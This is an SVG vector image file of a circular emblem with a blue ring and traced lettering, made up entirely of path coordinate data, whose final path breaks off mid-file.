<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="100%" viewBox="0 0 600 600" enable-background="new 0 0 600 600" xml:space="preserve">
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M357.000000,601.000000 
	C238.000000,601.000000 119.500000,601.000000 1.000000,601.000000 
	C1.000000,401.000000 1.000000,201.000000 1.000000,1.000000 
	C201.000000,1.000000 401.000000,1.000000 601.000000,1.000000 
	C601.000000,201.000000 601.000000,401.000000 601.000000,601.000000 
	C519.833313,601.000000 438.666656,601.000000 357.000000,601.000000 
M404.597076,496.104156 
	C406.008942,495.272247 407.399017,494.400543 408.835907,493.614349 
	C431.426331,481.253235 450.720917,464.806335 467.148071,445.152069 
	C481.672333,427.774475 493.063110,408.407471 501.420746,387.241791 
	C509.769897,366.097534 514.454285,344.145905 515.844849,321.599640 
	C516.955811,303.585358 515.666260,285.586182 512.048157,267.795502 
	C507.017395,243.059189 498.088654,219.872955 484.858521,198.396362 
	C473.169067,179.420807 459.206268,162.243729 441.685425,148.384613 
	C430.887817,139.843597 419.711578,131.562057 407.847473,124.632927 
	C381.041351,108.977036 351.707672,100.346008 320.828827,98.220924 
	C298.364990,96.674973 275.860992,97.915451 253.830948,103.567482 
	C232.360214,109.076019 212.094666,117.370949 193.133102,128.930740 
	C171.980698,141.826157 153.973892,158.350266 138.477448,177.424774 
	C127.074730,191.460358 117.922569,207.061478 110.525780,223.730667 
	C100.676315,245.927170 94.794991,269.123444 93.245659,293.161041 
	C92.087639,311.127411 92.546455,329.209167 95.884407,347.144684 
	C101.158493,375.483521 111.549370,401.669617 127.269623,425.746887 
	C138.266220,442.589294 151.165421,457.898041 167.020248,470.332916 
	C177.989746,478.936249 189.213837,487.456238 201.251556,494.407471 
	C228.717026,510.267487 258.776947,518.577454 290.318085,520.837952 
	C308.008392,522.105774 325.801941,521.097107 343.259644,517.734314 
	C364.487701,513.645264 384.833099,506.727264 404.597076,496.104156 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M404.286346,496.311646 
	C384.833099,506.727264 364.487701,513.645264 343.259644,517.734314 
	C325.801941,521.097107 308.008392,522.105774 290.318085,520.837952 
	C258.776947,518.577454 228.717026,510.267487 201.251556,494.407471 
	C189.213837,487.456238 177.989746,478.936249 167.020248,470.332916 
	C151.165421,457.898041 138.266220,442.589294 127.269623,425.746887 
	C111.549370,401.669617 101.158493,375.483521 95.884407,347.144684 
	C92.546455,329.209167 92.087639,311.127411 93.245659,293.161041 
	C94.794991,269.123444 100.676315,245.927170 110.525780,223.730667 
	C117.922569,207.061478 127.074730,191.460358 138.477448,177.424774 
	C153.973892,158.350266 171.980698,141.826157 193.133102,128.930740 
	C212.094666,117.370949 232.360214,109.076019 253.830948,103.567482 
	C275.860992,97.915451 298.364990,96.674973 320.828827,98.220924 
	C351.707672,100.346008 381.041351,108.977036 407.847473,124.632927 
	C419.711578,131.562057 430.887817,139.843597 441.685425,148.384613 
	C459.206268,162.243729 473.169067,179.420807 484.858521,198.396362 
	C498.088654,219.872955 507.017395,243.059189 512.048157,267.795502 
	C515.666260,285.586182 516.955811,303.585358 515.844849,321.599640 
	C514.454285,344.145905 509.769897,366.097534 501.420746,387.241791 
	C493.063110,408.407471 481.672333,427.774475 467.148071,445.152069 
	C450.720917,464.806335 431.426331,481.253235 408.835907,493.614349 
	C407.399017,494.400543 406.008942,495.272247 404.286346,496.311646 
M302.501526,102.000000 
	C283.550537,101.505615 265.169342,104.698250 246.966019,109.836113 
	C216.805328,118.348938 190.116837,133.191330 166.807999,153.860397 
	C142.629196,175.300919 124.279854,201.096909 111.929672,231.102646 
	C103.730309,251.023621 98.378616,271.732544 97.290512,293.118103 
	C96.494667,308.759613 97.650467,324.599640 99.155296,340.233887 
	C101.040810,359.823212 107.354424,378.367096 115.652580,396.165558 
	C122.839455,411.580505 131.806503,425.873901 142.469360,439.208282 
	C153.923782,453.532532 166.665253,466.553345 181.806641,476.714966 
	C194.706329,485.372131 208.361694,493.115723 222.346069,499.895203 
	C244.316925,510.546387 268.036987,515.373962 292.298706,516.839050 
	C302.682587,517.466125 313.180206,516.494629 323.612274,515.972412 
	C338.802521,515.212097 353.531128,511.807983 367.897491,507.041748 
	C408.718292,493.498840 442.490143,469.993195 468.850464,435.776123 
	C494.714020,402.203918 508.900818,364.211273 511.729889,322.202271 
	C512.702271,307.763489 511.709473,292.970154 509.711151,278.603485 
	C506.367859,254.566956 498.600708,231.781296 486.830658,210.365982 
	C473.039948,185.274155 455.042572,163.859116 432.612244,146.147003 
	C413.463470,131.026169 392.298004,119.511955 369.093658,112.009430 
	C347.814972,105.129532 326.018250,101.050896 302.501526,102.000000 
z"/>
<path fill="#000000" opacity="1.000000" stroke="none" 
	d="
M303.001099,102.000000 
	C326.018250,101.050896 347.814972,105.129532 369.093658,112.009430 
	C392.298004,119.511955 413.463470,131.026169 432.612244,146.147003 
	C455.042572,163.859116 473.039948,185.274155 486.830658,210.365982 
	C498.600708,231.781296 506.367859,254.566956 509.711151,278.603485 
	C511.709473,292.970154 512.702271,307.763489 511.729889,322.202271 
	C508.900818,364.211273 494.714020,402.203918 468.850464,435.776123 
	C442.490143,469.993195 408.718292,493.498840 367.897491,507.041748 
	C353.531128,511.807983 338.802521,515.212097 323.612274,515.972412 
	C313.180206,516.494629 302.682587,517.466125 292.298706,516.839050 
	C268.036987,515.373962 244.316925,510.546387 222.346069,499.895203 
	C208.361694,493.115723 194.706329,485.372131 181.806641,476.714966 
	C166.665253,466.553345 153.923782,453.532532 142.469360,439.208282 
	C131.806503,425.873901 122.839455,411.580505 115.652580,396.165558 
	C107.354424,378.367096 101.040810,359.823212 99.155296,340.233887 
	C97.650467,324.599640 96.494667,308.759613 97.290512,293.118103 
	C98.378616,271.732544 103.730309,251.023621 111.929672,231.102646 
	C124.279854,201.096909 142.629196,175.300919 166.807999,153.860397 
	C190.116837,133.191330 216.805328,118.348938 246.966019,109.836113 
	C265.169342,104.698250 283.550537,101.505615 303.001099,102.000000 
M428.088989,444.020905 
	C421.174866,442.687103 414.121094,441.830841 407.392517,439.862701 
	C402.356567,438.389648 400.191528,440.588287 397.954468,444.271271 
	C403.148132,445.758270 417.257843,462.470459 418.145905,468.420746 
	C420.515076,466.465088 422.621887,464.726044 424.031372,463.562561 
	C419.157928,458.184540 414.564636,453.115662 409.971344,448.046783 
	C410.280487,447.612122 410.589661,447.177460 410.898804,446.742798 
	C415.986023,447.824646 421.042847,449.086304 426.166473,449.952698 
	C438.653778,452.064178 438.666260,451.990387 441.575134,450.008331 
	C434.853699,441.644531 428.142273,433.293243 421.026520,424.438782 
	C419.670074,425.524933 417.455048,427.298553 415.230408,429.079895 
	C422.632141,431.794281 425.237732,438.501068 429.309814,443.703735 
	C429.183533,443.831024 429.057220,443.958344 428.088989,444.020905 
M431.778992,413.992249 
	C433.543762,414.026031 435.383331,413.747009 437.060242,414.148132 
	C444.058685,415.822021 450.989380,417.778229 457.983765,419.470520 
	C461.427582,420.303772 464.983795,420.940979 467.969055,417.976105 
	C461.378204,408.122070 454.967560,398.537384 448.556885,388.952728 
	C449.074585,388.478577 449.592316,388.004425 450.110016,387.530304 
	C458.919006,391.906281 467.727966,396.282288 476.951111,400.864014 
	C478.550171,397.768097 480.741760,393.600677 482.863983,389.398254 
	C485.873047,383.439636 485.825562,383.338776 481.239868,380.193726 
	C479.288940,384.081573 477.753937,388.550842 474.893616,391.882141 
	C474.147278,392.751343 469.273621,390.076721 465.933533,388.902405 
	C467.444977,386.324371 468.651947,384.265656 469.940735,382.067444 
	C468.796692,381.509705 467.231171,380.746490 465.714905,380.007294 
	C464.392365,382.279480 463.271271,384.205536 461.803925,386.726501 
	C459.617279,385.161255 456.203003,383.561737 456.379639,382.689362 
	C456.969543,379.776184 458.845367,377.123383 460.299316,374.229919 
	C459.180237,373.662903 457.586182,372.855255 455.677612,371.888245 
	C451.613220,379.859436 447.636871,387.657959 443.905701,394.975586 
	C451.768616,398.718567 453.399170,407.387573 458.530548,413.514069 
	C450.560760,411.435364 442.590973,409.356628 434.606262,407.273987 
	C433.154968,409.318329 431.735931,411.317261 429.822723,413.748627 
	C427.882935,415.874054 425.943115,417.999481 424.955658,419.081421 
	C433.233154,426.357819 440.943054,433.135254 448.596649,439.863220 
	C449.917450,438.769989 452.109467,436.955627 453.822693,435.537567 
	C446.512726,429.200226 439.667328,423.329285 432.924469,417.342834 
	C432.039734,416.557373 431.679993,415.180573 431.778992,413.992249 
M393.331879,434.904510 
	C401.841888,427.150177 411.205597,420.126709 418.635559,411.447784 
	C427.021606,401.651947 434.833344,390.981995 440.836914,379.606140 
	C454.663727,353.406464 460.059723,325.283112 457.145294,295.530243 
	C455.557892,279.324738 451.843536,263.879608 445.506897,248.921509 
	C434.007996,221.777481 416.250244,199.668671 391.990021,183.085373 
	C360.299072,161.422714 325.235382,152.823990 286.916687,156.865387 
	C268.148621,158.844818 250.535141,164.234604 233.884354,172.692169 
	C215.131226,182.217575 199.258453,195.441895 185.734070,211.653061 
	C165.134979,236.344437 153.871918,264.892334 151.221771,296.591797 
	C149.552582,316.557678 151.407303,336.453735 157.815002,355.789368 
	C168.076950,386.755493 185.651154,412.465424 211.714966,432.117615 
	C238.440704,452.268951 268.784698,462.353912 302.178253,462.881134 
	C310.718323,463.015991 319.337494,462.098755 327.823364,460.949280 
	C351.535583,457.737274 373.146332,449.024536 393.331879,434.904510 
M301.206543,134.998489 
	C297.607269,134.998489 294.007996,134.998489 290.287903,134.998489 
	C290.287903,128.379532 290.287903,122.472839 290.287903,115.924988 
	C294.951324,115.924988 299.342743,115.924988 303.964569,115.924988 
	C303.861664,114.005241 303.793884,112.740936 303.722961,111.417892 
	C297.036163,111.417892 290.668365,111.417892 284.000916,111.417892 
	C284.000916,119.140282 284.196686,126.455414 283.930206,133.753662 
	C283.760101,138.412521 285.991333,139.998932 290.157654,139.996628 
	C295.694946,139.993576 301.232269,139.995880 307.166809,139.995880 
	C307.166809,143.950287 307.166809,147.726990 307.166809,151.595062 
	C309.273499,151.595062 310.964905,151.595062 313.000000,151.595062 
	C313.000000,146.409790 313.000000,141.604279 313.000000,136.798782 
	C313.000000,132.212326 313.000000,127.625854 313.000000,123.039391 
	C313.849579,123.055351 314.699188,123.071312 315.548767,123.087265 
	C315.548767,132.585938 315.548767,142.084610 315.548767,151.755081 
	C318.216858,151.755081 319.808197,151.755081 321.678131,151.755081 
	C321.678131,137.488907 321.678131,123.446144 321.678131,109.030937 
	C319.630737,109.121796 317.924408,109.197517 316.287964,109.270142 
	C316.026031,112.541489 315.812164,115.212494 315.598297,117.883507 
	C314.950897,117.928146 314.303497,117.972786 313.656097,118.017426 
	C313.288177,115.110092 312.920258,112.202751 312.553070,109.301025 
	C310.682404,109.301025 309.094482,109.301025 306.999115,109.301025 
	C306.999115,116.194870 306.834351,122.820808 307.063446,129.433105 
	C307.192230,133.149628 306.022095,135.134109 301.206543,134.998489 
M462.089935,266.110596 
	C462.525330,267.173340 462.960754,268.236084 463.439606,269.404877 
	C468.537903,265.871460 471.794495,270.656036 477.211884,271.709717 
	C474.746857,273.523590 473.163635,274.252472 472.214905,275.474121 
	C469.985443,278.344788 466.360077,281.435394 466.332489,284.464630 
	C466.253510,293.141052 467.683289,301.831207 468.555359,310.884674 
	C470.211182,310.957886 472.016785,311.037720 473.850830,311.118835 
	C473.048157,307.937683 472.390106,305.329773 471.493286,301.775513 
	C481.487030,301.775513 490.569977,301.775513 500.200897,301.775513 
	C499.841461,298.865417 499.453369,295.723114 499.241791,294.010132 
	C489.908447,294.843903 481.247559,295.617615 472.498047,296.399261 
	C472.083771,292.377777 471.764465,289.278015 471.358459,285.336731 
	C477.293457,278.663452 483.721863,270.497955 496.223206,272.783173 
	C495.652313,269.411560 495.177124,266.605072 494.667847,263.597382 
	C489.499451,266.989227 484.393738,269.409576 478.351593,267.097290 
	C472.937805,265.025452 467.541687,262.907440 461.797791,260.677826 
	C461.898560,262.785980 461.960358,264.078491 462.089935,266.110596 
M239.819580,473.589111 
	C235.784134,481.354279 238.025574,489.792694 244.317749,494.857880 
	C251.024780,500.256989 261.553131,500.070374 268.303955,494.161102 
	C273.981323,489.191498 274.782318,478.402588 269.811371,471.609070 
	C264.622986,464.518341 247.750229,460.689423 239.819580,473.589111 
M167.867416,426.250305 
	C166.790924,433.725342 163.270065,441.090820 166.124527,449.338104 
	C175.990692,442.835144 182.047638,432.851776 192.282181,428.945465 
	C190.597000,426.970062 188.632492,424.667267 187.646790,423.511810 
	C182.517105,428.378326 177.688614,432.959137 172.860123,437.539917 
	C172.462143,437.340210 172.064178,437.140503 171.666214,436.940765 
	C172.660995,431.521912 174.017715,426.138062 174.546600,420.674103 
	C175.054443,415.427460 179.193100,409.139343 172.142761,405.886017 
	C165.269318,414.394226 157.349243,421.356903 147.892319,427.491302 
	C149.627213,429.212677 151.439240,431.010559 152.440323,432.003845 
	C157.906891,426.855469 162.969238,422.087769 169.060532,416.351044 
	C168.574097,420.375610 168.270340,422.888763 167.867416,426.250305 
M136.479675,404.135742 
	C140.184799,402.342224 143.860153,400.483673 147.602234,398.770874 
	C152.822922,396.381287 158.093445,394.100647 163.768936,391.584381 
	C162.958572,390.009644 161.671448,387.508453 161.001160,386.205933 
	C154.670822,389.737183 148.806595,393.008423 142.942368,396.279663 
	C142.512009,395.890015 142.081635,395.500397 141.651260,395.110779 
	C144.777771,388.699493 147.560318,382.087616 151.143906,375.942902 
	C153.821655,371.351440 152.674103,367.969238 150.305420,365.079193 
	C141.816132,372.320801 131.933197,375.933289 121.627762,379.167297 
	C122.550415,380.977264 123.789337,383.407654 124.661224,385.118042 
	C131.381561,381.566040 137.688583,378.232513 143.995605,374.898987 
	C141.213470,382.538635 137.693542,389.238129 134.528503,396.101257 
	C133.539948,398.244843 133.378159,400.819214 133.175598,403.224854 
	C133.143494,403.606140 134.904373,404.138397 136.479675,404.135742 
M299.790955,475.469025 
	C299.717438,481.382080 299.643890,487.295135 299.570374,493.208191 
	C299.052277,493.226166 298.534180,493.244141 298.016083,493.262115 
	C294.008820,487.500061 289.647552,481.945282 286.111969,475.907013 
	C283.521484,471.482819 280.544922,469.811310 276.515991,471.247406 
	C277.368195,481.856598 277.411865,492.087036 273.719513,502.541260 
	C276.408905,502.541260 279.031769,502.541260 280.907532,502.541260 
	C280.907532,495.313995 280.907532,488.343475 280.907532,480.147217 
	C289.354950,488.891785 292.328064,500.353149 302.455719,506.351379 
	C303.643799,494.738770 304.746582,483.959900 305.852570,473.149445 
	C304.107849,473.003113 301.234253,472.762054 297.856110,472.478668 
	C298.481934,473.524078 298.874329,474.179596 299.790955,475.469025 
M148.019455,192.523514 
	C149.685471,193.860641 151.392349,195.150360 153.009491,196.544189 
	C157.121872,200.088730 159.437531,200.150299 163.113724,196.348328 
	C167.714340,191.590317 172.268356,186.777695 176.631287,181.803391 
	C178.850449,179.273254 178.946335,176.315125 176.318192,173.869812 
	C172.457092,170.277328 168.453506,166.837997 164.338409,163.180328 
	C162.888840,164.542313 161.455307,165.889206 159.982101,167.273392 
	C161.522827,168.977158 162.739990,170.323105 164.459000,172.223999 
	C162.266693,174.691681 160.242950,177.242569 157.929855,179.496521 
	C155.619934,181.747360 153.020279,183.700867 150.516724,185.810776 
	C149.496506,185.153854 147.732681,184.018112 145.913773,182.846893 
	C144.773880,184.488403 143.865295,185.796814 142.372131,187.947021 
	C144.122192,189.330154 145.818527,190.670822 148.019455,192.523514 
M396.444092,449.913177 
	C396.176819,448.480927 395.909546,447.048706 395.574036,445.250824 
	C392.591644,446.767059 389.771912,448.200592 387.251251,449.482086 
	C389.040863,451.369415 390.700470,452.643982 391.734131,454.307434 
	C393.984985,457.929535 395.784241,461.830963 398.011047,465.469513 
	C401.139374,470.581055 400.681671,474.281738 396.306213,476.877380 
	C392.492340,479.139832 388.724731,477.594879 385.897827,472.600586 
	C384.036102,469.311401 382.053619,466.081635 380.372437,462.702271 
	C379.207184,460.359985 378.463013,457.808197 377.344910,454.860229 
	C375.177246,456.132629 372.709045,457.581421 370.766785,458.721466 
	C374.484253,465.052399 378.233643,470.916870 381.453125,477.059052 
	C385.067139,483.953888 392.076599,485.183624 397.348480,481.353760 
	C401.682800,478.204987 406.621460,476.210266 410.063629,473.943207 
	C405.479279,465.799805 401.180573,458.163818 396.444092,449.913177 
M469.504761,371.000427 
	C475.468079,373.183929 481.431396,375.367462 487.613586,377.631104 
	C488.293488,375.507721 489.157684,372.808594 489.831299,370.704803 
	C484.936615,369.386963 480.459381,368.181549 475.982147,366.976105 
	C480.242767,364.520752 484.396576,363.113312 488.559021,361.731750 
	C493.489288,360.095306 495.631104,356.590942 495.739777,351.790680 
	C489.644226,354.567291 483.665283,357.290771 477.747009,359.986603 
	C476.899048,357.613342 476.579315,355.948242 475.765167,354.576538 
	C472.660034,349.345001 465.874603,348.121185 463.032135,352.771454 
	C460.150360,357.486053 458.622986,363.028503 456.852997,367.352020 
	C461.477997,368.728027 465.095764,369.804352 469.504761,371.000427 
M113.273064,289.338318 
	C109.523743,292.359955 107.823311,296.372559 108.063622,301.082031 
	C108.311287,305.935455 108.892822,310.771851 109.292809,315.221130 
	C119.414368,312.265289 129.931168,314.659790 140.730225,316.238434 
	C140.730225,313.537323 140.730225,310.468964 140.730225,307.316193 
	C133.640762,309.881592 126.746941,309.181976 119.698006,308.185455 
	C115.014610,307.523285 112.902420,305.646332 112.958862,300.910889 
	C113.015762,296.137665 116.327370,294.227203 119.940918,294.191528 
	C126.873901,294.123108 133.816696,295.047791 140.837006,295.566498 
	C140.837006,293.256927 140.837006,290.622009 140.837006,288.256042 
	C138.334900,288.514313 135.985672,288.924530 133.629684,288.967865 
	C127.097649,289.088074 120.562782,289.055481 113.273064,289.338318 
M389.096710,161.656845 
	C390.690674,158.229462 392.630310,154.914566 393.791443,151.346344 
	C395.251770,146.858521 397.113190,144.236786 402.074310,147.823593 
	C402.842834,146.101562 403.416077,144.817154 404.079224,143.331192 
	C401.993286,142.301132 400.191772,141.411530 398.357300,140.505646 
	C399.665070,137.704895 400.837738,135.193512 402.199585,132.276962 
	C400.300842,131.352798 398.621735,130.535538 396.659943,129.580688 
	C392.857605,138.095001 389.285370,146.094040 385.693970,154.135986 
	C378.752411,151.237137 372.458771,148.439911 366.012634,146.054855 
	C364.671753,145.558716 362.766113,146.589020 361.120728,146.915863 
	C362.076813,148.107773 362.789276,149.799866 364.031250,150.404800 
	C369.339996,152.990463 374.774506,155.328400 380.225616,157.607147 
	C383.067871,158.795303 383.458191,160.388687 382.046326,163.029587 
	C380.872650,165.225067 380.143768,167.658325 379.127808,170.212601 
	C381.330475,170.914932 382.842804,171.397141 384.611145,171.960968 
	C386.085022,168.670929 387.489929,165.534790 389.096710,161.656845 
M203.954620,438.497620 
	C202.156891,437.098419 200.359146,435.699219 199.744629,435.220917 
	C189.513992,441.727478 180.300217,448.358215 168.871292,452.058502 
	C171.544510,454.041595 173.995270,455.859680 175.397720,456.900085 
	C178.816422,454.230621 181.782867,451.914276 185.116074,449.311584 
	C188.078110,452.367554 191.892426,454.603271 192.704681,457.641510 
	C193.446686,460.416931 190.938766,464.061157 189.609558,468.091309 
	C191.054108,469.196625 193.598648,471.143616 196.309601,473.217926 
	C196.815552,470.029999 197.044937,467.313507 197.698013,464.703064 
	C199.839661,456.142609 202.135269,447.620636 203.954620,438.497620 
M426.936646,185.512665 
	C425.552582,186.346664 424.168518,187.180649 422.727814,188.048767 
	C420.447174,185.908401 418.301208,183.894424 416.144653,181.870499 
	C413.613190,183.616577 411.492279,185.227036 414.403320,187.869446 
	C423.625580,196.240799 432.927307,204.524643 442.198273,212.842316 
	C441.677795,213.507767 441.157318,214.173233 440.636841,214.838684 
	C441.676331,213.699173 442.715820,212.559662 443.711121,211.468628 
	C440.619202,207.766327 437.787964,204.376190 435.259033,201.348022 
	C438.924866,197.395081 442.379425,193.669983 445.821838,189.957962 
	C443.323212,184.946732 442.890015,184.917236 438.936066,188.513474 
	C436.040283,191.147278 432.948456,193.565536 429.557556,196.403259 
	C428.594818,195.417465 427.806000,194.609726 426.750122,193.528549 
	C431.100708,189.552917 435.089172,185.908188 438.546936,182.748428 
	C437.318756,180.836777 436.279968,179.219894 434.732788,176.811722 
	C431.865295,180.046951 429.660278,182.534729 426.936646,185.512665 
M127.114113,358.211792 
	C128.660370,363.416473 125.024925,367.285706 118.030396,367.498993 
	C118.951157,370.594299 119.843231,373.593231 120.623955,376.217773 
	C128.176559,370.273651 135.380356,364.585815 142.604630,358.924042 
	C148.554047,354.261383 148.564774,354.275085 145.689316,348.506348 
	C134.023849,348.417786 123.115051,347.592590 111.665413,344.603088 
	C112.337379,347.381622 112.959061,349.952240 113.612617,352.654694 
	C120.857880,349.173584 125.443649,350.971832 127.114113,358.211792 
M335.102173,492.396332 
	C332.480499,487.460876 329.625824,482.632141 327.302948,477.559845 
	C324.995361,472.520905 321.597076,470.734222 317.897369,471.999542 
	C314.570160,483.532776 311.497742,494.182800 308.511505,504.534058 
	C310.783142,504.534058 313.486053,504.534058 314.761658,504.534058 
	C315.573883,500.431396 315.156219,495.843811 317.198883,494.035767 
	C319.407440,492.080872 324.725433,491.255219 327.199158,492.624725 
	C329.909271,494.125122 330.918976,498.697021 332.669678,501.930389 
	C333.062775,502.822601 334.649719,502.633209 336.224823,502.372437 
	C337.744904,502.120758 339.252777,501.795380 340.495575,501.554749 
	C338.729797,498.528748 337.122437,495.774231 335.102173,492.396332 
M365.613831,120.392014 
	C364.676453,121.732460 363.739075,123.072914 362.664764,124.609154 
	C364.579254,125.603302 365.780792,126.227234 367.038269,126.880203 
	C362.483459,132.767639 362.090485,135.840271 365.020752,141.015152 
	C367.111298,144.707138 373.359711,147.152786 378.611328,145.892181 
	C384.003082,144.597946 386.115326,140.491776 386.284943,136.525955 
	C388.633759,135.444427 390.264893,134.693375 391.896027,133.942307 
	C390.762207,132.679993 389.737549,131.289062 388.455841,130.200943 
	C387.612610,129.485062 386.396729,129.210022 385.351288,128.729843 
	C384.227905,128.213852 383.108612,127.688820 382.035797,127.190163 
	C382.380829,125.449646 382.656372,124.059601 382.977692,122.438728 
	C381.229767,121.961121 379.733704,121.552338 378.256317,121.148651 
	C377.349915,122.461731 376.618469,123.521324 375.848724,124.636414 
	C372.537262,123.295403 369.387115,122.019714 365.613831,120.392014 
M470.786499,326.988037 
	C469.416016,327.590942 467.125427,327.914124 466.841766,328.847382 
	C465.857300,332.085999 465.134766,335.536591 465.135712,338.906342 
	C465.136719,342.501190 466.720551,345.852600 470.667084,346.725037 
	C474.722076,347.621552 478.546051,347.146149 481.040161,343.011841 
	C482.304840,340.915497 483.666870,338.701355 485.513947,337.184784 
	C487.199646,335.800690 490.321381,333.980774 491.536926,334.653564 
	C494.252472,336.156464 494.922943,339.342468 493.168060,342.415894 
	C491.607147,345.149597 489.989746,347.851074 488.253052,350.812683 
	C493.049866,350.587036 497.284729,349.901428 497.807343,344.139709 
	C498.076385,341.173737 498.470428,338.031860 497.792389,335.213806 
	C496.910767,331.549377 495.148987,327.867584 490.762268,327.116638 
	C486.828247,326.443176 483.990753,328.208130 481.667908,331.523254 
	C479.247803,334.977173 476.252563,338.028107 472.982574,341.874176 
	C471.686707,339.861298 470.012817,338.442932 470.190247,337.316010 
	C470.728149,333.899109 471.982758,330.595062 472.982239,327.164398 
	C472.832855,327.147888 472.185608,327.076263 470.786499,326.988037 
M120.157349,335.882019 
	C118.464050,335.102203 115.430122,334.489227 115.308716,333.513794 
	C114.773399,329.212616 115.077446,324.806976 115.077446,320.176300 
	C111.631081,320.639526 108.559311,321.917755 109.079788,326.391785 
	C109.489479,329.913666 109.749161,333.931549 111.622749,336.670868 
	C113.520805,339.445892 117.112602,342.100311 120.337517,342.664581 
	C124.281548,343.354736 126.935493,340.024200 128.108826,335.996948 
	C128.883774,333.337128 129.730743,330.625549 131.070862,328.231232 
	C131.836380,326.863556 133.555206,325.532471 135.040100,325.263611 
	C135.842484,325.118317 137.768005,327.139771 137.942596,328.361542 
	C138.372650,331.371124 138.083435,334.483459 138.083435,338.006073 
	C139.470352,337.559998 141.195404,337.005157 142.983429,336.430054 
	C142.983429,333.402588 143.147049,330.738556 142.946869,328.102173 
	C142.606689,323.621826 138.397491,318.410614 134.730606,318.113647 
	C129.605759,317.698639 127.046043,320.917267 125.332054,325.251343 
	C123.956566,328.729462 122.355591,332.118347 120.157349,335.882019 
M136.792801,279.608551 
	C129.918854,281.589203 129.035736,275.970123 126.639267,271.662262 
	C126.000343,273.722260 125.991951,275.601074 126.001945,277.479858 
	C126.029205,282.600983 128.849686,286.202667 133.405762,286.946869 
	C136.999878,287.533936 141.678024,284.744537 142.885834,280.651245 
	C144.245377,276.043762 145.002579,271.258575 145.801895,267.566467 
	C134.904755,265.328156 124.577232,263.206848 114.166481,261.068451 
	C113.799652,263.421509 113.352707,266.288452 113.111191,267.837677 
	C122.339767,269.381256 131.109711,270.848114 140.994690,272.501465 
	C139.489410,275.234314 138.433792,277.150787 136.792801,279.608551 
M454.338654,196.903976 
	C458.023590,193.386688 461.708557,189.869385 465.582886,186.171341 
	C457.823151,177.938660 450.605560,170.281189 443.093231,162.310989 
	C441.654633,164.019058 440.762665,165.078094 439.907806,166.093063 
	C445.846802,172.622971 451.489227,178.826797 457.661133,185.612793 
	C452.397339,189.969772 447.415222,193.991058 442.578918,198.180664 
	C441.576599,199.048996 441.115723,200.542358 440.405273,201.747635 
	C442.058441,202.246552 444.170654,203.640030 445.276611,203.072540 
	C448.294159,201.524155 450.886993,199.148178 454.338654,196.903976 
M187.317307,201.935333 
	C184.476746,198.310440 181.636169,194.685547 178.740311,190.990097 
	C181.333588,188.044907 185.233490,183.615784 189.145264,179.173187 
	C186.977646,175.827393 185.146729,176.058563 182.828613,178.620956 
	C175.077515,187.188797 167.196747,195.639343 159.364014,204.133316 
	C156.429230,207.315857 158.888123,208.560989 161.297318,210.084015 
	C165.363815,205.634109 169.249710,201.381851 173.697678,196.514511 
	C175.830261,198.892868 177.706100,200.963974 179.558609,203.055756 
	C182.498688,206.375595 185.223312,206.661285 187.317307,201.935333 
M214.484955,455.961243 
	C210.332443,462.656189 206.179932,469.351135 201.860275,476.315582 
	C203.948181,477.442047 206.557861,478.849976 208.075623,479.668823 
	C212.759384,471.297760 217.100830,463.538513 221.610107,455.479309 
	C224.309540,457.635803 226.294205,459.221283 228.495758,460.980011 
	C229.673431,459.716461 230.866684,458.436249 232.366562,456.826996 
	C226.227097,453.174042 220.550217,449.655853 214.734818,446.383789 
	C210.610489,444.063232 209.242416,444.796509 207.570923,449.481201 
	C209.437897,450.006531 211.355270,450.422546 213.179382,451.092468 
	C215.193848,451.832275 216.739716,452.957367 214.484955,455.961243 
M359.113190,491.958435 
	C357.394440,492.476410 355.665558,493.417633 353.960144,493.376801 
	C352.623169,493.344788 350.425140,492.353485 350.136230,491.349213 
	C347.947205,483.739899 346.134766,476.022217 344.069977,467.801086 
	C341.897644,468.430542 339.135864,469.230804 337.634430,469.665863 
	C340.460602,480.176300 343.162628,490.225128 345.930542,500.518921 
	C351.123322,499.095490 357.520966,497.341797 363.988281,495.569000 
	C363.988281,492.892303 363.988281,490.625549 363.988281,487.767731 
	C362.385986,489.246185 361.087738,490.444122 359.113190,491.958435 
M220.884277,147.331146 
	C221.670898,146.783951 222.492584,145.725952 223.238113,145.777115 
	C226.639694,146.010620 230.009399,146.700729 233.410812,146.946472 
	C236.595016,147.176529 237.442154,145.387894 236.633270,142.549133 
	C225.804947,140.707092 225.905594,140.626343 218.711945,131.658829 
	C217.832901,130.563019 215.176468,130.892990 213.343735,130.562210 
	C213.041443,130.990097 212.739151,131.417969 212.436859,131.845840 
	C217.211960,140.388184 217.226196,148.136627 209.049713,155.132080 
	C211.444778,155.827377 214.316574,156.686615 215.479736,155.642456 
	C217.673859,153.672852 218.884171,150.607315 220.884277,147.331146 
M242.001999,145.523056 
	C244.881241,152.269470 244.962936,152.305771 250.098877,148.830307 
	C247.889511,143.745758 245.649780,138.591309 243.445770,133.519104 
	C246.119293,131.674667 250.602768,131.055481 246.872787,126.444664 
	C245.026199,126.916199 243.200439,127.382408 241.253113,127.879669 
	C239.630081,125.114037 238.097244,122.502083 236.430908,119.662659 
	C234.612198,120.771851 233.271149,121.589722 231.592392,122.613564 
	C235.140442,130.243561 238.516083,137.502777 242.001999,145.523056 
M223.002655,163.527756 
	C226.102905,170.800018 227.263809,171.562927 233.880157,168.872162 
	C240.984055,165.983124 247.884521,162.593842 255.169998,159.288467 
	C254.236343,157.670746 253.451126,156.310181 252.629944,154.887299 
	C244.963013,158.244370 237.697800,161.425552 230.262070,164.681396 
	C228.529999,160.900696 226.977875,157.512787 225.308960,153.869965 
	C223.393295,154.888977 221.721207,155.778412 219.912216,156.740662 
	C221.009293,158.959457 221.952042,160.866089 223.002655,163.527756 
M229.906281,484.356781 
	C233.532928,476.407898 237.159592,468.459045 240.993820,460.055176 
	C239.220032,459.292755 236.499283,458.123291 234.964188,457.463470 
	C230.443069,467.524811 226.129639,477.123962 221.833954,486.683624 
	C224.023987,487.625397 226.667847,488.762299 229.510590,489.984741 
	C229.510590,488.059998 229.510590,486.532318 229.906281,484.356781 
M475.537476,320.002258 
	C483.510071,320.760956 491.482697,321.519653 499.669281,322.298676 
	C499.669281,320.042450 499.669281,317.197052 499.669281,315.565399 
	C488.930206,315.011658 478.571930,314.477570 468.157471,313.940582 
	C467.992828,315.969055 467.760162,318.835266 467.553589,321.379913 
	C470.020386,320.900970 472.338501,320.450867 475.537476,320.002258 
M466.612518,230.945602 
